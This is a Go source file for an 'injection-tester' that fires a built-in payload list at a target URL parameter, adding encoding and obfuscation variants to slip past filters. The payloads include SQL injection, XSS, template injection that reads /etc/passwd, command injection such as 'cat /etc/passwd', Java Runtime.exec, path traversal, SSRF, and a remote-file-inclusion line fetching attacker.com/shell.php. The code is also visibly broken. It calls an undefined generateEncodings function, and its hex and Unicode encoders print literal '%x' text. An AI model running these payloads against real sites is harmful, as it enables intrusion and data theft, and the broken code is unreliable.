package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"time"
)

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: injection-tester <target_url> <parameter>")
		fmt.Println("Example: injection-tester http://example.com/page=parameter")
		os.Exit(1)
	}
	targetURL := os.Args[1]
	param := os.Args[2]

	// Injection payloads covering multiple attack types
	payloads := []string{
		// SQL Injection
		"' OR 1=1 --",
		"\" OR 1=1 --",
		"1' AND SLEEP(5) --",
		"1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",

		// Cross-Site Scripting (XSS)
		"<script>alert(1)</script>",
		"\"\"><script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",

		// Server-Side Template Injection (SSTI)
		"{{7*7}}",
		"{{ self.__class__.__mro__[1].__subclasses__() }}",
		"{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
		"{{ config.items() }}",

		// LDAP Injection
		"*",
		"*) (|(uid=*))(|(uid=*",

		// Command Injection
		"1;whoami",
		"1 && ls -la",
		"1 | cat /etc/passwd",
		"1 & net user",

		// Expression Language (EL) Injection
		"${7*7}",
		"${T(java.lang.Runtime).getRuntime().exec('whoami')}",

		// XPath Injection
		"') or '1'='1",
		"\" ] | //user/* | [a = \"",

		// GraphQL Injection
		`{"query": "{user(id: \"1 OR 1=1\") {name email}}}"}`,

		// Server-Side Request Forgery (SSRF)
		"http://127.0.0.1",
		"http://localhost:80",
		"file:///etc/passwd",

		// Local File Inclusion (LFI)
		"../../../../etc/passwd",
		"../../../../windows/system32/drivers/etc/hosts",

		// Remote File Inclusion (RFI)
		"http://attacker.com/shell.php",
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",

		// NoSQL Injection
		`{"$ne": null}`,
		`{"$gt": ""}`,

		// Mass Assignment
		"admin=true",
	}

	// Iterate over each payload and apply different encoding techniques
	for _, payload := range payloads {
		encodedVariants := generateEncodings(payload)
		for encType, encodedPayload := range encodedVariants {
			fmt.Printf("Testing [%s] encoding for payload: %s\n", encType, payload)
			fullURL, err := buildURL(targetURL, param, encodedPayload)
			if err != nil {
				fmt.Printf("Error constructing URL: %v\n", err)
				continue
			}
			testPayload(fullURL)
			// Short delay between requests to avoid overwhelming the target server.
			time.Sleep(500 * time.Millisecond)
		}
	}
}

// generateAdvancedEncodings returns a map with advanced encoding/obfuscation variants.
func generateAdvancedEncodings(payload string) map[string]string {
	variants := generateEncodings(payload) // existing raw, url, double_url, base64

	// Add hex encoding variant
	variants["hex"] = hexEncode(payload)
	
	// Add Unicode (UTF-8) encoding variant
	variants["unicode"] = unicodeEncode(payload)
	
	// Add randomized case and comment insertion variant
	variants["obfuscated"] = obfuscatePayload(payload)

	// Optionally add triple URL encoding variant
	tripEnc := url.QueryEscape(url.QueryEscape(url.QueryEscape(payload)))
	variants["triple_url"] = tripEnc

	return variants
}

// hexEncode converts the payload to a hex string (e.g., "\x27\x20...")
func hexEncode(payload string) string {
	hexStr := ""
	for _, c := range payload {
		hexStr += fmt.Sprintf("%%x", c)
	}
	return hexStr
}

// unicodeEncode converts the payload to a simple Unicode representation.
func unicodeEncode(payload string) string {
	unicodeStr := ""
	for _, c := range payload {
		unicodeStr += fmt.Sprintf("%%u%04x", c)
	}
	return unicodeStr
}

// obfuscatePayload randomizes case and inserts inline comments
func obfuscatePayload(payload string) string {
	// Simple example: insert a comment after every 3 characters.
	obfuscated := ""
	for i, c := range payload {
		obfuscated += string(c)
		if i > 0 && i%3 == 0 {
			obfuscated += "/**/"
		}
	}
	return obfuscated
}


// buildURL appends the encoded payload to the specified parameter in the target URL.
func buildURL(baseURL, param, payload string) (string, error) {
	u, err := url.Parse(baseURL)
	if err != nil {
		return "", err
	}
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	return u.String(), nil
}

// testPayload sends an HTTP GET request to the full URL and prints status and response length.
func testPayload(fullURL string) {
	client := &http.Client{
		Timeout: 10 * time.Second,
	}
	resp, err := client.Get(fullURL)
	if err != nil {
		fmt.Printf("Error making request to %s: %v\n", fullURL, err)
		return
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("Error reading response from %s: %v\n", fullURL, err)
		return
	}
	fmt.Printf("URL: %s\nStatus: %s | Response Length: %d bytes\n\n", fullURL, resp.Status, len(body))
}
